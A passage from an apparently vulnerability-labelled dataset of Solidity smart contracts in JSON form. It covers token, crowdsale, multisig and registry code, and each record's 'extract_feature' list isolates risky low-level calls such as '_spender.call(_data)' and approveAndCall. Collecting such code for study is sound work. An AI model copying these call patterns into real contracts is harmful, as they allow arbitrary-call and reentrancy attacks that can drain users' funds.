increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract PalliumToken is MintableToken, PausableToken, ERC827Token, CanReclaimToken {\n string public constant name = 'PalliumToken';\n string public constant symbol = 'PLMT';\n uint8 public constant decimals = 18;\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n require (totalSupply_ + _amount <= 250 * 10**6 * 10**18);\n return super.mint(_to, _amount);\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n token = token;\n }\n function _postValidatePurchase(address, uint256) internal {\n token = token;\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address, uint256) internal {\n token = token;\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract StagedCrowdsale is Crowdsale {\n struct Stage {\n uint index;\n uint256 hardCap;\n uint256 softCap;\n uint256 currentMinted;\n uint256 bonusMultiplier;\n uint256 startTime;\n uint256 endTime;\n }\n mapping (uint => Stage) public stages;\n uint256 public currentStage;\n enum State { Created, Paused, Running, Finished }\n State public currentState = State.Created;\n function StagedCrowdsale() public {\n currentStage = 0;\n }\n function setStage(uint _nextStage) internal {\n currentStage = _nextStage;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(currentState == State.Running);\n require((now >= stages[currentStage].startTime) && (now <= stages[currentStage].endTime));\n require(_beneficiary != address(0));\n require(_weiAmount >= 200 szabo);\n }\n function computeTokensWithBonus(uint256 _weiAmount) public view returns(uint256) {\n uint256 tokenAmount = super._getTokenAmount(_weiAmount);\n uint256 bonusAmount = tokenAmount.mul(stages[currentStage].bonusMultiplier).div(100);\n return tokenAmount.add(bonusAmount);\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n uint256 tokenAmount = computeTokensWithBonus(_weiAmount);\n uint256 currentHardCap = stages[currentStage].hardCap;\n uint256 currentMinted = stages[currentStage].currentMinted;\n if (currentMinted.add(tokenAmount) > currentHardCap) {\n return currentHardCap.sub(currentMinted);\n }\n return tokenAmount;\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n require(_tokenAmount > 0);\n super._processPurchase(_beneficiary, _tokenAmount);\n uint256 surrender = computeTokensWithBonus(msg.value) - _tokenAmount;\n if (msg.value > 0 && surrender > 0)\n {\n uint256 currentRate = computeTokensWithBonus(msg.value) / msg.value;\n uint256 surrenderEth = surrender.div(currentRate);\n _beneficiary.transfer(surrenderEth);\n }\n }\n function _getTokenRaised(uint256 _weiAmount) internal view returns (uint256) {\n return stages[currentStage].currentMinted.add(_getTokenAmount(_weiAmount));\n }\n function _updatePurchasingState(address, uint256 _weiAmount) internal {\n stages[currentStage].currentMinted = stages[currentStage].currentMinted.add(computeTokensWithBonus(_weiAmount));\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n function RefundVault(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n Closed();\n wallet.transfer(this.balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n Refunded(investor, depositedValue);\n }\n}\ncontract StagedRefundVault is RefundVault {\n event ClosedStage();\n event Active();\n function StagedRefundVault (address _wallet) public\n RefundVault(_wallet) {\n }\n function stageClose() onlyOwner public {\n ClosedStage();\n wallet.transfer(this.balance);\n }\n function activate() onlyOwner public {\n require(state == State.Refunding);\n state = State.Active;\n Active();\n }\n}\ncontract MintedCrowdsale is Crowdsale {\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n require(MintableToken(token).mint(_beneficiary, _tokenAmount));\n }\n}\ncontract PalliumCrowdsale is StagedCrowdsale, MintedCrowdsale, Pausable {\n StagedRefundVault public vault;\n function PalliumCrowdsale(uint256 _rate, address _wallet) public\n Crowdsale(_rate, _wallet, new PalliumToken())\n StagedCrowdsale(){\n _processPurchase(_wallet, 25*(10**24));\n vault = new StagedRefundVault(_wallet);\n stages[0] = Stage(0, 5*(10**24), 33*(10**23), 0, 100, 1522540800, 1525132800);\n stages[1] = Stage(1, 375*(10**23), 2475*(10**22), 0, 50, 1533081600, 1535760000);\n stages[2] = Stage(2, 75*(10**24), 495*(10**23), 0, 25, 1543622400, 1546300800);\n stages[3] = Stage(3, 1075*(10**23), 7095*(10**22), 0, 15, 1554076800, 1556668800);\n }\n function goalReached() internal view returns (bool) {\n return stages[currentStage].currentMinted >= stages[currentStage].softCap;\n }\n function hardCapReached() internal view returns (bool) {\n return stages[currentStage].currentMinted >= stages[currentStage].hardCap;\n }\n function claimRefund() public {\n require(!goalReached());\n require(currentState == State.Running);\n vault.refund(msg.sender);\n }\n function toggleVaultStateToAcive() public onlyOwner {\n require(now >= stages[currentStage].startTime - 1 days);\n vault.activate();\n }\n function finalizeCurrentStage() public onlyOwner {\n require(now > stages[currentStage].endTime || hardCapReached());\n require(currentState == State.Running);\n if (goalReached()) {\n vault.stageClose();\n } else {\n vault.enableRefunds();\n }\n if (stages[currentStage].index < 3) {\n setStage(currentStage + 1);\n } else\n {\n finalizationCrowdsale();\n }\n }\n function finalizationCrowdsale() internal {\n vault.close();\n setState(StagedCrowdsale.State.Finished);\n PalliumToken(token).finishMinting();\n PalliumToken(token).transferOwnership(owner);\n }\n function migrateCrowdsale(address _newOwner) public onlyOwner {\n require(currentState == State.Paused);\n PalliumToken(token).transferOwnership(_newOwner);\n StagedRefundVault(vault).transferOwnership(_newOwner);\n }\n function setState(State _nextState) public onlyOwner {\n bool canToggleState\n = (currentState == State.Created && _nextState == State.Running)\n || (currentState == State.Running && _nextState == State.Paused)\n || (currentState == State.Paused && _nextState == State.Running)\n || (currentState == State.Running && _nextState == State.Finished);\n require(canToggleState);\n currentState = _nextState;\n }\n function manualPurchaseTokens (address _beneficiary, uint256 _weiAmount) public onlyOwner {\n _preValidatePurchase(_beneficiary, _weiAmount);\n uint256 tokens = _getTokenAmount(_weiAmount);\n _processPurchase(_beneficiary, tokens);\n TokenPurchase(msg.sender, _beneficiary, _weiAmount, tokens);\n _updatePurchasingState(_beneficiary, _weiAmount);\n }\n function _forwardFunds() internal {\n vault.deposit.value(this.balance)(msg.sender);\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1442"
  },
  "filename": "20215.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MultiSend is Ownable {\n using SafeMath for uint256;\n Peculium public pecul;\n address public peculAdress = 0x3618516f45cd3c913f81f9987af41077932bc40d;\n uint256 public decimals;\n function MultiSend() public{\n pecul = Peculium(peculAdress);\n decimals = pecul.decimals();\n }\n function Send(address[] _vaddr, uint256[] _vamounts) onlyOwner\n {\n require ( _vaddr.length == _vamounts.length );\n uint256 amountToSendTotal = 0;\n for (uint256 indexTest=0; indexTest<_vaddr.length; indexTest++)\n {\n amountToSendTotal = amountToSendTotal + _vamounts[indexTest];\n }\n require(amountToSendTotal*10**decimals<=pecul.balanceOf(this));\n for (uint256 index=0; index<_vaddr.length; index++)\n {\n address toAddress = _vaddr[index];\n uint256 amountTo_Send = _vamounts[index]*10**decimals;\n pecul.transfer(toAddress,amountTo_Send);\n }\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Peculium is BurnableToken,Ownable {\n PeculiumOld public peculOld;\n address public peculOldAdress = 0x53148Bb4551707edF51a1e8d7A93698d18931225;\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n string public name = \"Peculium\";\n string public symbol = \"PCL\";\n uint256 public decimals = 8;\n uint256 public constant MAX_SUPPLY_NBTOKEN = 20000000000*10**8;\n mapping(address => bool) public balancesCannotSell;\n event ChangedTokens(address changedTarget,uint256 amountToChanged);\n event FrozenFunds(address address_target, bool bool_canSell);\n function Peculium() public {\n totalSupply = MAX_SUPPLY_NBTOKEN;\n balances[address(this)] = totalSupply;\n peculOld = PeculiumOld(peculOldAdress);\n }\n function transfer(address _to, uint256 _value) public returns (bool)\n {\n require(balancesCannotSell[msg.sender]==false);\n return BasicToken.transfer(_to,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(balancesCannotSell[msg.sender]==false);\n return StandardToken.transferFrom(_from,_to,_value);\n }\n function ChangeLicense(address target, bool canSell) public onlyOwner\n {\n balancesCannotSell[target] = canSell;\n FrozenFunds(target, canSell);\n }\n function UpgradeTokens() public\n {\n require(peculOld.totalSupply()>0);\n uint256 amountChanged = peculOld.allowance(msg.sender,address(this));\n require(amountChanged>0);\n peculOld.transferFrom(msg.sender,address(this),amountChanged);\n peculOld.burn(amountChanged);\n balances[address(this)] = balances[address(this)].sub(amountChanged);\n balances[msg.sender] = balances[msg.sender].add(amountChanged);\n Transfer(address(this), msg.sender, amountChanged);\n ChangedTokens(msg.sender,amountChanged);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function getBlockTimestamp() public constant returns (uint256)\n {\n return now;\n }\n function getOwnerInfos() public constant returns (address ownerAddr, uint256 ownerBalance)\n {\n ownerAddr = owner;\n ownerBalance = balanceOf(ownerAddr);\n }\n}\ncontract PeculiumOld is BurnableToken,Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n string public name = \"Peculium\";\n string public symbol = \"PCL\";\n uint256 public decimals = 8;\n uint256 public constant MAX_SUPPLY_NBTOKEN = 20000000000*10**8;\n uint256 public dateStartContract;\n mapping(address => bool) public balancesCanSell;\n uint256 public dateDefrost;\n event FrozenFunds(address target, bool frozen);\n event Defroze(address msgAdd, bool freeze);\n function PeculiumOld() {\n totalSupply = MAX_SUPPLY_NBTOKEN;\n balances[owner] = totalSupply;\n balancesCanSell[owner] = true;\n dateStartContract=now;\n dateDefrost = dateStartContract + 85 days;\n }\n function defrostToken() public\n {\n require(now>dateDefrost);\n balancesCanSell[msg.sender]=true;\n Defroze(msg.sender,true);\n }\n function transfer(address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return BasicToken.transfer(_to,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return StandardToken.transferFrom(_from,_to,_value);\n }\n function freezeAccount(address target, bool canSell) onlyOwner\n {\n balancesCanSell[target] = canSell;\n FrozenFunds(target, canSell);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function getBlockTimestamp() constant returns (uint256)\n {\n return now;\n }\n function getOwnerInfos() constant returns (address ownerAddr, uint256 ownerBalance)\n {\n ownerAddr = owner;\n ownerBalance = balanceOf(ownerAddr);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1443"
  },
  "filename": "20313.sol",
  "content": "pragma solidity ^0.4.15;\ncontract MultiSigWallet {\n event Confirmation(address indexed sender, uint indexed transactionId);\n event Revocation(address indexed sender, uint indexed transactionId);\n event Submission(uint indexed transactionId);\n event Execution(uint indexed transactionId);\n event ExecutionFailure(uint indexed transactionId);\n event Deposit(address indexed sender, uint value);\n event OwnerAddition(address indexed owner);\n event OwnerRemoval(address indexed owner);\n event RequirementChange(uint required);\n uint constant public MAX_OWNER_COUNT = 50;\n mapping (uint => Transaction) public transactions;\n mapping (uint => mapping (address => bool)) public confirmations;\n mapping (address => bool) public isOwner;\n address[] public owners;\n uint public required;\n uint public transactionCount;\n struct Transaction {\n address destination;\n uint value;\n bytes data;\n bool executed;\n }\n modifier onlyWallet() {\n require(msg.sender == address(this));\n _;\n }\n modifier ownerDoesNotExist(address owner) {\n require(!isOwner[owner]);\n _;\n }\n modifier ownerExists(address owner) {\n require(isOwner[owner]);\n _;\n }\n modifier transactionExists(uint transactionId) {\n require(transactions[transactionId].destination != 0);\n _;\n }\n modifier confirmed(uint transactionId, address owner) {\n require(confirmations[transactionId][owner]);\n _;\n }\n modifier notConfirmed(uint transactionId, address owner) {\n require(!confirmations[transactionId][owner]);\n _;\n }\n modifier notExecuted(uint transactionId) {\n require(!transactions[transactionId].executed);\n _;\n }\n modifier notNull(address _address) {\n require(_address != 0);\n _;\n }\n modifier validRequirement(uint ownerCount, uint _required) {\n require(ownerCount <= MAX_OWNER_COUNT\n && _required <= ownerCount\n && _required != 0\n && ownerCount != 0);\n _;\n }\n function()\n payable\n {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n function MultiSigWallet(address[] _owners, uint _required)\n public\n validRequirement(_owners.length, _required)\n {\n for (uint i=0; i<_owners.length; i++) {\n require(!isOwner[_owners[i]] && _owners[i] != 0);\n isOwner[_owners[i]] = true;\n }\n owners = _owners;\n required = _required;\n }\n function addOwner(address owner)\n public\n onlyWallet\n ownerDoesNotExist(owner)\n notNull(owner)\n validRequirement(owners.length + 1, required)\n {\n isOwner[owner] = true;\n owners.push(owner);\n OwnerAddition(owner);\n }\n function removeOwner(address owner)\n public\n onlyWallet\n ownerExists(owner)\n {\n isOwner[owner] = false;\n for (uint i=0; i<owners.length - 1; i++)\n if (owners[i] == owner) {\n owners[i] = owners[owners.length - 1];\n break;\n }\n owners.length -= 1;\n if (required > owners.length)\n changeRequirement(owners.length);\n OwnerRemoval(owner);\n }\n function replaceOwner(address owner, address newOwner)\n public\n onlyWallet\n ownerExists(owner)\n ownerDoesNotExist(newOwner)\n {\n for (uint i=0; i<owners.length; i++)\n if (owners[i] == owner) {\n owners[i] = newOwner;\n break;\n }\n isOwner[owner] = false;\n isOwner[newOwner] = true;\n OwnerRemoval(owner);\n OwnerAddition(newOwner);\n }\n function changeRequirement(uint _required)\n public\n onlyWallet\n validRequirement(owners.length, _required)\n {\n required = _required;\n RequirementChange(_required);\n }\n function submitTransaction(address destination, uint value, bytes data)\n public\n returns (uint transactionId)\n {\n transactionId = addTransaction(destination, value, data);\n confirmTransaction(transactionId);\n }\n function confirmTransaction(uint transactionId)\n public\n ownerExists(msg.sender)\n transactionExists(transactionId)\n notConfirmed(transactionId, msg.sender)\n {\n confirmations[transactionId][msg.sender] = true;\n Confirmation(msg.sender, transactionId);\n executeTransaction(transactionId);\n }\n function revokeConfirmation(uint transactionId)\n public\n ownerExists(msg.sender)\n confirmed(transactionId, msg.sender)\n notExecuted(transactionId)\n {\n confirmations[transactionId][msg.sender] = false;\n Revocation(msg.sender, transactionId);\n }\n function executeTransaction(uint transactionId)\n public\n ownerExists(msg.sender)\n confirmed(transactionId, msg.sender)\n notExecuted(transactionId)\n {\n if (isConfirmed(transactionId)) {\n Transaction storage txn = transactions[transactionId];\n txn.executed = true;\n if (external_call(txn.destination, txn.value, txn.data.length, txn.data))\n Execution(transactionId);\n else {\n ExecutionFailure(transactionId);\n txn.executed = false;\n }\n }\n }\n function external_call(address destination, uint value, uint dataLength, bytes data) private returns (bool) {\n bool result;\n assembly {\n let x := mload(0x40)\n let d := add(data, 32)\n result := call(\n sub(gas, 34710),\n destination,\n value,\n d,\n dataLength,\n x,\n 0\n )\n }\n return result;\n }\n function isConfirmed(uint transactionId)\n public\n constant\n returns (bool)\n {\n uint count = 0;\n for (uint i=0; i<owners.length; i++) {\n if (confirmations[transactionId][owners[i]])\n count += 1;\n if (count == required)\n return true;\n }\n }\n function addTransaction(address destination, uint value, bytes data)\n internal\n notNull(destination)\n returns (uint transactionId)\n {\n transactionId = transactionCount;\n transactions[transactionId] = Transaction({\n destination: destination,\n value: value,\n data: data,\n executed: false\n });\n transactionCount += 1;\n Submission(transactionId);\n }\n function getConfirmationCount(uint transactionId)\n public\n constant\n returns (uint count)\n {\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionId][owners[i]])\n count += 1;\n }\n function getTransactionCount(bool pending, bool executed)\n public\n constant\n returns (uint count)\n {\n for (uint i=0; i<transactionCount; i++)\n if ( pending && !transactions[i].executed\n || executed && transactions[i].executed)\n count += 1;\n }\n function getOwners()\n public\n constant\n returns (address[])\n {\n return owners;\n }\n function getConfirmations(uint transactionId)\n public\n constant\n returns (address[] _confirmations)\n {\n address[] memory confirmationsTemp = new address[](owners.length);\n uint count = 0;\n uint i;\n for (i=0; i<owners.length; i++)\n if (confirmations[transactionId][owners[i]]) {\n confirmationsTemp[count] = owners[i];\n count += 1;\n }\n _confirmations = new address[](count);\n for (i=0; i<count; i++)\n _confirmations[i] = confirmationsTemp[i];\n }\n function getTransactionIds(uint from, uint to, bool pending, bool executed)\n public\n constant\n returns (uint[] _transactionIds)\n {\n uint[] memory transactionIdsTemp = new uint[](transactionCount);\n uint count = 0;\n uint i;\n for (i=0; i<transactionCount; i++)\n if ( pending && !transactions[i].executed\n || executed && transactions[i].executed)\n {\n transactionIdsTemp[count] = i;\n count += 1;\n }\n _transactionIds = new uint[](to - from);\n for (i=from; i<to; i++)\n _transactionIds[i - from] = transactionIdsTemp[i];\n }\n}\ncontract MultiSigWalletWithDailyLimit is MultiSigWallet {\n event DailyLimitChange(uint dailyLimit);\n uint public dailyLimit;\n uint public lastDay;\n uint public spentToday;\n function MultiSigWalletWithDailyLimit(address[] _owners, uint _required, uint _dailyLimit)\n public\n MultiSigWallet(_owners, _required)\n {\n dailyLimit = _dailyLimit;\n }\n function changeDailyLimit(uint _dailyLimit)\n public\n onlyWallet\n {\n dailyLimit = _dailyLimit;\n DailyLimitChange(_dailyLimit);\n }\n function executeTransaction(uint transactionId)\n public\n ownerExists(msg.sender)\n confirmed(transactionId, msg.sender)\n notExecuted(transactionId)\n {\n Transaction storage txn = transactions[transactionId];\n bool _confirmed = isConfirmed(transactionId);\n if (_confirmed || txn.data.length == 0 && isUnderLimit(txn.value)) {\n txn.executed = true;\n if (!_confirmed)\n spentToday += txn.value;\n if (txn.destination.call.value(txn.value)(txn.data))\n Execution(transactionId);\n else {\n ExecutionFailure(transactionId);\n txn.executed = false;\n if (!_confirmed)\n spentToday -= txn.value;\n }\n }\n }\n function isUnderLimit(uint amount)\n internal\n returns (bool)\n {\n if (now > lastDay + 24 hours) {\n lastDay = now;\n spentToday = 0;\n }\n if (spentToday + amount > dailyLimit || spentToday + amount < spentToday)\n return false;\n return true;\n }\n function calcMaxWithdraw()\n public\n constant\n returns (uint)\n {\n if (now > lastDay + 24 hours)\n return dailyLimit;\n if (dailyLimit < spentToday)\n return 0;\n return dailyLimit - spentToday;\n }\n}",
  "extract_feature": [
    "function external_call(address destination, uint value, uint dataLength, bytes data) private returns (bool) {\nbool result;\nassembly {\nlet x := mload(0x40)\nlet d := add(data, 32)\nresult := call(\nsub(gas, 34710),\ndestination,\nvalue,\nd,\ndataLength,\nx,\n0\n)\n}\nreturn result;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1444"
  },
  "filename": "20862.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AbstractPaymentEscrow is Ownable {\n address public wallet;\n mapping (uint => uint) public deposits;\n event Payment(address indexed _customer, uint indexed _projectId, uint value);\n event Withdraw(address indexed _wallet, uint value);\n function withdrawFunds() public;\n function changeWallet(address _wallet)\n public\n onlyOwner()\n {\n wallet = _wallet;\n }\n function getDeposit(uint _projectId)\n public\n constant\n returns (uint)\n {\n return deposits[_projectId];\n }\n}\ncontract TokitRegistry is Ownable {\n struct ProjectContracts {\n address token;\n address fund;\n address campaign;\n }\n mapping (address => bool) public registrars;\n mapping (address => mapping(uint => ProjectContracts)) public registry;\n mapping (uint => ProjectContracts) public project_registry;\n event RegisteredToken(address indexed _projectOwner, uint indexed _projectId, address _token, address _fund);\n event RegisteredCampaign(address indexed _projectOwner, uint indexed _projectId, address _campaign);\n modifier onlyRegistrars() {\n require(registrars[msg.sender]);\n _;\n }\n function TokitRegistry(address _owner) {\n setRegistrar(_owner, true);\n transferOwnership(_owner);\n }\n function register(address _customer, uint _projectId, address _token, address _fund)\n onlyRegistrars()\n {\n registry[_customer][_projectId].token = _token;\n registry[_customer][_projectId].fund = _fund;\n project_registry[_projectId].token = _token;\n project_registry[_projectId].fund = _fund;\n RegisteredToken(_customer, _projectId, _token, _fund);\n }\n function register(address _customer, uint _projectId, address _campaign)\n onlyRegistrars()\n {\n registry[_customer][_projectId].campaign = _campaign;\n project_registry[_projectId].campaign = _campaign;\n RegisteredCampaign(_customer, _projectId, _campaign);\n }\n function lookup(address _customer, uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n registry[_customer][_projectId].token,\n registry[_customer][_projectId].fund,\n registry[_customer][_projectId].campaign\n );\n }\n function lookupByProject(uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n project_registry[_projectId].token,\n project_registry[_projectId].fund,\n project_registry[_projectId].campaign\n );\n }\n function setRegistrar(address _registrar, bool enabled)\n onlyOwner()\n {\n registrars[_registrar] = enabled;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract AbstractSingularDTVToken is Token {\n}\ncontract SingularDTVFund {\n string public version = \"0.1.0\";\n AbstractSingularDTVToken public singularDTVToken;\n address public 